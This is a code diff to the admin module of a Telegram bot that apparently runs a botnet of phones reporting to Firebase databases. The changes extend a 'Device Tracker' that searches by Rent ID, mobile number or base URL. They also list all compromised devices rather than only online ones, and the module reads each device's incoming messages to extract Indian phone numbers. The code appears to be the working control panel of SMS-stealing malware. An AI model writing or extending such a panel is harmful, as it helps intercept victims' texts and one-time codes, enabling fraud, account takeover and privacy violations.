@@ -25,7 +25,6 @@ async def admin_home_msg(msg: Message):
     countries = get_countries(d)
     users_count = len(d.get("users", {}))
     total_servers = sum(len(get_servers_grouped(d, c)) for c in countries)
-        
     text = (
         f"👑 <b>{sc('admin dashboard')}</b>\n\n"
         f"🌍 {sc('countries')}: <b>{len(countries)}</b>\n"
@@ -62,28 +61,36 @@ async def admin_vip(cq: CallbackQuery):
 async def admin_track_device(cq: CallbackQuery, state: FSMContext):
     await cq.answer()
     await state.set_state(S.track_query)
-    await cq.message.edit_text("🔍 <b>Device Tracker</b>\n\nSend Rent ID or Mobile Number:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:home", "❌")]]), parse_mode="HTML")
+    await cq.message.edit_text("🔍 <b>Device Tracker</b>\n\nSend Rent ID, Mobile Number, or Base URL:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:home", "❌")]]), parse_mode="HTML")
 
 @admin_router.message(S.track_query)
 async def admin_track_device_done(msg: Message, state: FSMContext):
     await state.clear()
-    query = msg.text.strip()
+    query = msg.text.strip().lower()
     status = await msg.answer(f"🔄 Searching for <code>{query}</code>...", parse_mode="HTML")
     d = db.load_data()
     found = []
+    
     async def check_fb(fb):
+        if query in fb['url'].lower():
+            clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+            if clients and isinstance(clients, dict):
+                for dev_id, c in clients.items(): found.append((fb, dev_id, c))
+            return
         clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
-        if not clients: return
+        if not clients or not isinstance(clients, dict): return
         for dev_id, c in clients.items():
-            if query.lower() in dev_id.lower() or (isinstance(c, dict) and query in str(c)):
+            if query in dev_id.lower() or (isinstance(c, dict) and query in str(c).lower()):
                 found.append((fb, dev_id, c))
+                
     tasks = [check_fb(fb) for fb in d.get("firebases", [])]
     await asyncio.gather(*tasks)
     
     if not found: return await status.edit_text(f"❌ No device found for <code>{query}</code>.", parse_mode="HTML")
     text = f"🔍 <b>Result ({len(found)}):</b>\n\n"
-    for fb, dev_id, c in found[:5]:
-        text += f"🆔 <code>{dev_id}</code>\n🔗 <code>{fb['url']}</code>\n🟢 {c.get('status')}\n\n"
+    for fb, dev_id, c in found[:10]:
+        stat = "🟢" if c.get("status") is True else "🔴"
+        text += f"{stat} 🆔 <code>{dev_id}</code>\n🔗 <code>{fb['url']}</code>\n\n"
     await status.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:home", "🔙")]]), parse_mode="HTML")
 
 @admin_router.callback_query(F.data == "admin:manage_fb")
@@ -103,21 +110,15 @@ async def admin_country(cq: CallbackQuery):
     country = cq.data.split(":")[2]
     d = db.load_data()
     servers = get_servers_grouped(d, country)
-    
-    if not servers: 
-        return await cq.message.edit_text(f"❌ No servers in {country}.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:manage_fb", "🔙")]]), parse_mode="HTML")
-    
+    if not servers: return await cq.message.edit_text(f"❌ No servers in {country}.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:manage_fb", "🔙")]]), parse_mode="HTML")
     async def get_ping(srv):
         try: return await fbu.check_ping(srv[0]["url"], srv[0].get("auth"))
         except: return "❌ Timeout"
-        
     pings = await asyncio.gather(*[get_ping(srv) for srv in servers])
-    
     kb = []
     for i, (srv, ping) in enumerate(zip(servers, pings)):
         kb.append([btn(f"server {i+1} ({ping})", f"admin:server:{country}:{i}", "📁")])
     kb.append([btn("back", "admin:manage_fb", "🔙")])
-    
     await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
 @admin_router.callback_query(F.data.startswith("admin:server:"))
@@ -131,30 +132,20 @@ async def admin_server(cq: CallbackQuery):
     srv = servers[idx]
     try: await cq.message.edit_text("🔄 Fetching online counts...")
     except: pass
-    
-    now = time.time()
     async def get_counts(fb):
         clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
-        online = sum(1 for c in clients.values() if isinstance(c, dict) and (c.get("status") is True or c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)) if clients else 0
+        online = sum(1 for c in clients.values() if isinstance(c, dict) and c.get("status") is True) if clients else 0
         total = len(clients) if clients else 0
         return online, total
-
     counts = await asyncio.gather(*[get_counts(fb) for fb in srv])
-    
     text = f"📁 <b>Server {idx+1} Bases:</b>\n\n"
     kb = []
-    
     for i, (online, total) in enumerate(counts):
         url = srv[i]['url']
-        url_short = url.replace("https://", "").replace("http://", "")
-        
-        text += f"🔹 <b>Base {i+1}:</b> {online} ON / {total} Total\n🔗 <code>{url_short}</code>\n\n"
-        
+        text += f"🔹 <b>Base {i+1}:</b> {online} ON / {total} Total\n🔗 <code>{url}</code>\n\n"
         kb.append([btn(f"open base {i+1}", f"admin:base:{country}:{idx}:{i}", "🗂")])
-        
     kb.append([btn("remove base", f"admin:rmmenu:{country}:{idx}", "🗑")])
     kb.append([btn("back", f"admin:country:{country}", "🔙")])
-    
     await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
 @admin_router.callback_query(F.data.startswith("admin:base:"))
@@ -167,22 +158,16 @@ async def admin_base(cq: CallbackQuery):
     fb = servers[srv_idx][base_idx]
     try: await cq.message.edit_text("🔄 Fetching devices...")
     except: pass
-    
     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
     kb = []
-    now = time.time()
-    
-    if clients:
+    if clients and isinstance(clients, dict):
         for dev_id, c in clients.items():
-            # 🔥 FIX: Admin and User same logic
             if isinstance(c, dict):
-                is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
-                if is_online:
-                    kb.append([btn(f"device {dev_id[:10]}", f"admin:dev:{country}:{srv_idx}:{base_idx}:{dev_id}", "📱")])
-                
+                status_icon = "🟢" if c.get("status") is True else "🔴"
+                kb.append([btn(f"{status_icon} device {dev_id[:10]}", f"admin:dev:{country}:{srv_idx}:{base_idx}:{dev_id}", "📱")])
     kb.append([btn("back", f"admin:server:{country}:{srv_idx}", "🔙")])
-    if len(kb) == 1: return await cq.message.edit_text("❌ No online devices found.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
-    await cq.message.edit_text(f"Base {base_idx+1} - Only Online Devices:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
+    if len(kb) == 1: return await cq.message.edit_text("❌ No devices found in this base.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
+    await cq.message.edit_text(f"Base {base_idx+1} - All Devices:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
 @admin_router.callback_query(F.data.startswith("admin:dev:"))
 async def admin_device(cq: CallbackQuery):
@@ -194,18 +179,14 @@ async def admin_device(cq: CallbackQuery):
     fb = servers[srv_idx][base_idx]
     try: await cq.message.edit_text("🔄 Fetching numbers...")
     except: pass
-    
     msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=100", fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
     best_nums = fbu.extract_best_numbers({}, msgs)
-    
     text = f"📱 <b>Device Info</b>\n🆔 {dev_id}\n🔗 {fb['url']}\n\n<b>Numbers:</b>\n"
     if not best_nums: text += "No numbers found."
     for n, c in best_nums: text += f"📞 +91{n} (Conf: {c}%)\n"
-        
     d.setdefault("device_numbers", {})[dev_id] = {"numbers": [n for n,c in best_nums], "base": f"Base {base_idx+1}", "srv": f"Server {srv_idx+1}"}
     db.save_data(d)
-    
     kb = [[btn("back", f"admin:base:{country}:{srv_idx}:{base_idx}", "🔙")]]
     await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
